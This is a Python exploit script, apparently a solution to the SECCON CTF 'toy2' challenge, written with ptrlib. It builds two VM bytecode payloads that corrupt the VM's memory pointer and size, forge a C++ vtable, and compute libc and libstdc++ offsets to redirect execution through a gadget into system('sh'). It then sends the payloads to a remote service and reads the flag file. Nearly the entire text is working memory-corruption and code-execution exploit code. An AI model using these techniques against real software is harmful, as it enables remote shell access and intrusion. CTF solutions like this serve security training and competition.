from ptrlib import *
import os
import time

HOST = os.getenv("SECCON_HOST", "localhost")
PORT = int(os.getenv("SECCON_PORT", "5000"))

elf = ELF("./toy2")
libc = ELF("./libc.so.6")
libcpp = ELF("./libstdc++.so.6.0.33")
lib_offset = 0x240000 # offset between libc and libstdc++

OFS_LABELS = 0x600
OFS_VARS   = 0x800
DELTA      = 0

cache_labels = {}
labels = b""
label_pos = 0

cache_variables = {}
variables = b""
variable_pos = 0

def L(name):
    global cache_labels, label_pos, labels
    if name in cache_labels:
        pos = cache_labels[name]
    else:
        pos = (OFS_LABELS - DELTA) + label_pos
        cache_labels[name] = pos
        label_pos += 2
    return pos

def DEF_LABEL(name, code):
    global cache_labels, label_pos, labels
    if name in cache_labels:
        pos = cache_labels[name] - (OFS_LABELS - DELTA)
    else:
        pos = label_pos
        cache_labels[name] = (OFS_LABELS - DELTA) + pos
        label_pos += 2
    if len(labels) < pos:
        labels += b'\x00' * (pos - len(labels))
        labels += p16(len(code) - DELTA)
    else:
        labels = labels[:pos] + p16(len(code) - DELTA) + labels[pos+2:]

def V(name, const=0):
    global cache_variables, variable_pos, variables
    if name in cache_variables:
        pos = cache_variables[name]
    else:
        pos = (OFS_VARS - DELTA) + variable_pos
        cache_variables[name] = pos
        variables += p16(const)
        variable_pos += 2
    return pos

def C(value):
    return V(random_str(8, 8), value)

def JMP(vec): return p16(vec & 0xfff)
def ADC(src): return p16(0x1000 | (src & 0xfff))
def XOR(src): return p16(0x2000 | (src & 0xfff))
def SBC(src): return p16(0x3000 | (src & 0xfff))
def ROR(): return p16(0x4000)
def TAT(): return p16(0x5000) # T = A
def OR (src): return p16(0x6000 | (src & 0xfff))
def ILL(): return p16(0x7000)
def AND(src): return p16(0x8000 | (src & 0xfff))
def LDC(src): return p16(0x9000 | (src & 0xfff)) # A = [src]; C = 0
def BCC(vec): return p16(0xa000 | (vec & 0xfff))
def BNE(vec): return p16(0xb000 | (vec & 0xfff))
def LDI(): return p16(0xc000) # A = [A]
def STT(): return p16(0xd000) # [A] = T
def LDA(src): return p16(0xe000 | (src & 0xfff)) # A = [src]
def STA(dst): return p16(0xf000 | (dst & 0xfff)) # [dst] = A

"""
First code (call _start again)
"""
code = b''
# Overwrite memory pointer
code += LDA(C(0xc8ff))
code += TAT()
code += LDA(C(0xfff))
code += STT()
DELTA = 0x10
code += b"A" * 0x10
# Overwrite memory size
code += LDA(C(0x8000)) # be aware of mask
code += TAT()
code += LDA(C(0xff8))
code += STT()

# Overwrite memory pointer again
code += JMP(L("restore"))
DELTA = -8 # temporary context
code += TAT() * 10 # nop sled
code += JMP(L("done"))
DELTA = 0x10
DEF_LABEL("restore", code)
code += LDA(C(0xb0ff))
code += TAT()
code += LDA(C(0xfef))
code += STT()
DELTA = -8

# Create fake vtable
def adjust_elf(pos, target):
    o  = b''
    for i in range(4):
        o += LDA(i*2)
        o += STA(pos + i*2)
    o += LDC(pos)
    if target < elf.symbol("_ZTV2VM"):
        o += SBC(C(elf.symbol("_ZTV2VM") - target + 0x10))
    else:
        o += ADC(C(target - elf.symbol("_ZTV2VM") - 0x10))
    o += STA(pos)
    return o
ofs_vtable = 0x400
DEF_LABEL("done", code)
code += adjust_elf(ofs_vtable+8, elf.symbol("_start"))

# Overwrite vtable
for i in range(4):
    code += LDA(C(0x1008 + i*2))
    code += LDI()
    code += STA(i*2)
code += LDC(0)
code += ADC(C(ofs_vtable))
code += STA(0)

# Call start again
code += ILL()

code += b'\x00' * (OFS_LABELS - len(code))
code += labels
code += b'\x00' * (OFS_VARS - len(code))
code += variables
code += b'\x00' * (0x1000 - len(code))


"""
Second code (use libc address calculated from c++ exception)
"""
OFS_LABELS = 0x600
OFS_VARS   = 0x800
DELTA      = 0

cache_labels = {}
labels = b""
label_pos = 0

cache_variables = {}
variables = b""
variable_pos = 0

code2 = b''
code2 += JMP(L("satoki"))
code2 += b'A'*(0x10 - len(code2))
DELTA = -0xc0
code2 += JMP(L("bailout"))
DELTA = 0
code2 += b'A'*(0xc0 - len(code2))
DEF_LABEL("satoki", code2)
# Overwrite memory pointer
code2 += LDA(C(0x08ff))
code2 += TAT()
code2 += LDA(C(0xfff))
code2 += STT()
DELTA = -0xc0
# Create fake vtable
DEF_LABEL("bailout", code2)
a = libcpp.symbol("_ZN9__gnu_cxx27__verbose_terminate_handlerEv")
b = next(libc.gadget("mov rdi, [rax+0x640]; call [rax+0x638]"))
diff = lib_offset + a - b
code2 += LDC(0)
code2 += SBC(C(diff & 0xffff))
code2 += STA(0)
code2 += LDA(2)
code2 += SBC(C(diff >> 16))
code2 += STA(2)
# Overwrite vtable
for i in range(4):
    code2 += LDA(0x30 + i*2)
    code2 += STA(0xb8 + i*2)
code2 += LDC(0xb8)
code2 += SBC(C(0x60))
code2 += STA(0xb8)

# Prepare argument
for i in range(4):
    code2 += LDA(0x30 + i*2)
    code2 += STA(0x638 + i*2)
code2 += LDA(C(u16(b"sh")))
code2 += STA(0x58)
code2 += LDA(C(0))
code2 += STA(0x5a)

# Prepare system function
for i in range(4):
    code2 += LDA(i*2)
    code2 += STA(0x630 + i*2)
c = 0x582c2 # do_system+alpha # libc.symbol("system")
diff = b - c
code2 += LDC(0x630)
code2 += SBC(C(diff & 0xffff))
code2 += STA(0x630)
code2 += LDA(0x630 + 2)
code2 += SBC(C(diff >> 16))
code2 += STA(0x630 + 2)

# Win
DEF_LABEL("win", code2)
code2 += JMP(L("win"))

code2 += b'\x00' * (OFS_LABELS - len(code2))
code2 += labels
code2 += b'\x00' * (OFS_VARS - len(code2))
code2 += variables
code2 += b'\x00' * (0x1000 - len(code2))

assert len(code) == 0x1000
assert len(code2) == 0x1000

#sock = Process("./toy2", cwd="../files")
sock = Socket(HOST, PORT)
sock.send(code)
time.sleep(0.5)
sock.send(code2)
time.sleep(0.5)
sock.sendline("cat /flag*.txt")

while True:
    l = sock.recvline(timeout=3)
    if b"SECCON" in l:
        print(l)
        break

sock.close()
